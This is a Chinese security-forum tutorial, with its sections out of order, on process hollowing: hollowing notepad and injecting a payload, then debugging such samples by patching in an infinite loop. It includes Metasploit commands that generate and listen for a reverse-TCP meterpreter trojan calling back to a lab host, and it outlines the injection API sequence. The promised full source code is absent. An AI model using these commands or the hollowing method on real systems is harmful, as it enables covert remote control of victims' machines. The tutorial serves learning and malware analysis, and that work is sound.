
![图片描述](upload/attach/202205/941725_YDCVGCNVQUVWS6B.png)

使用循环映射PE节表，根据PE节数量调用`WriteProcessMemory()`，循环完成后`test`彻底被映射到`notepad`进程空间

![图片描述](upload/attach/202205/941725_YXGWJEWQB3YEQTQ.png)

为保证映射到`notepad`中的`test`能够正常运行，需要调用`SetThreadContext`设置正确的`EIP`

![图片描述](upload/attach/202205/941725_Q72TQ8Y9USVJ4UT.png)

最后调用`ResumeThread`恢复线程运行

![图片描述](upload/attach/202205/941725_5YPDTTQR9FBHAW3.png)

### 逆向分析傀儡进程

如果想调试此种类型的程序，有很多方法，现在我们可以设置无限循环的方式进行调试，具体方式如下

1. 查看程序入口点

![图片描述](upload/attach/202205/941725_8K957WUJ34PBX98.png)

在`010Edit`中跳转到`162D`这个位置，然后修改两个字节为`0xEB 0xFE`(`0xEB 0xFE`是无限循环指令，相当于`Jump Address = NextEIP()+0xFE(-2)`)，修改信息如下图

修改前

![图片描述](upload/attach/202205/941725_F9CXGJJBX78Q4HQ.png)

修改后，记得`Ctrl+S`保存

![图片描述](upload/attach/202205/941725_M4W5544QDPNNCZ4.png)

然后就可以附加调试了，如下图

![图片描述](upload/attach/202205/941725_MU5NEZ9D6SFSUWF.png)

附加到调试器后，程序在系统库区域暂停，如下图

![图片描述](upload/attach/202205/941725_D7AFT5QKZT3GFGP.png)

使用`Ctrl+G`直接跳转到`40162D`这个位置

![图片描述](upload/attach/202205/941725_SAZ3FBG665TPMZ3.png)

然后使用`F2`在`EIP`地址处设置断点，然后`F9`运行，断下来之后使用`Ctrl+E`将指令恢复原来的代码(`0x42,0x42`)，接着就可以开始调试了

![图片描述](upload/attach/202205/941725_JCMVXYPYDEKCGSE.png)

### 最后

其实通过傀儡进程这种方式执行恶意代码在大量的样本中都会遇到，各种病毒木马对此情有独钟，而且常常是多层套娃，通常还会结合一些反调试技术和混淆增加逆向分析的难度，给逆向分析人员带来极大的挑战，虽然技术难度不高，但是多种手段结合使用起来恶心人还是有一套的，所以掌握各种调试方式对我们的帮助是非常有用的。好了，就到这里，如果有些地方需要补充，我会及时更新的。

## 前言

傀儡进程这种技术其实很早就出现了，傀儡进程是将目标进程的映射文件替换为指定的映射文件，替换后的进程称之为傀儡进程；常常有恶意程序将隐藏在自己文件内的恶意代码加载进目标进程，而在加载进目标进程之前，会利用`ZwUnmpViewOfSection`或者`NtUnmapViewOfSection`进行相关设置。程序先以挂起方式创建某个进程`A.exe`，然后将另一个进程`B.exe`映射到`A.exe`进程的内存空间，并在`A.exe`进程中运行，如下图

![图片描述](https://bbs.kanxue.com/upload/attach/202205/941725_P3ASGSQ9A7H6EAH.png)

### 傀儡进程原理

1. 使用`CreatreProcess`创建进程时传入`CREATE_SUSPENDED`以挂起方式创建目标进程
2. 调用`NtUnmapViewOfSection`卸载目标的内存数据
3. 调用`VirtualAllocEx`在目标进程申请内存
4. 调用`WriteProcessMemory`向内存写入`ShellCode`
5. 调用`GetThreadContext`获取目标进程的`CONTEXT`
6. 调用`SetThreadContext`设置入口点
7. 调用`ResumeThread`恢复进程，执行`ShellCode`

### 注意事项

1. 选择目标进程

选择目标进程时，不能对已经运行的进程进行替换，因为无法控制指针，也无法获得主线程句柄

2. 卸载内存数据

在卸载目标进程内存时需要使用未导出函数`NtUnmapViewOfSection`，需要从`ntdll.dll`中获取，其实`NtUnmapViewOfSection`还可以用来结束进程

3. 申请内存

使用`VirtualAllocEx`函数申请内存时，可以将目标进程的`ImageBaseAddress`作为申请内存空间的首地址，这样做的好处是可以不用考虑重定位的问题

4. 写入`ShellCode`

在目标进程中写入`ShellCode`时，如果`ShellCode`和目标进程的`ImageBaseAddress`存在偏移，需要使用`.reloc`区段进程重定位

5. 恢复目标进程的运行环境

完成替换后要调用`SetThreadContext`修改`EAX`寄存器(`进程的入口点`)，这也是为什么之前要用`GetThreadContext`获取目标进程的`CONTEXT`，最后调用`ResumeThread`恢复线程运行

### 实战

接下来我们在使用`Kali`生成一个反弹端口木马，取名`test.exe`，然后在`Kali`上进行监听，等待目标系统上线。然后将`test.exe`复制到`Windows`桌面，为创建傀儡进程做准备。

在`Kali`上会用到如下命令

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 | `msfconsole` `#进入MSF控制台` `msfvenom` `-p windows/meterpreter/reverse_tcp lhost=192.168.10.27 lport=8888 -f exe -o test.exe` `#生成木马，lhost是我们的主机ip，lport是我们主机的用于监听的端口` `use exploit/multi/handler` `#使用exploit/multi/handler监听从肉鸡发来的数据` `set payload windows/meterpreter/reverse_tcp` `#设置payload，不同的木马设置不同的payload` `set lhost 192.168.10.27` `#我们的主机ip` `set lport 8888` `#我们的主机端口` `exploit` `#执行` |

### 创建傀儡进程完整代码如下

|  |  |
| --- | --- |
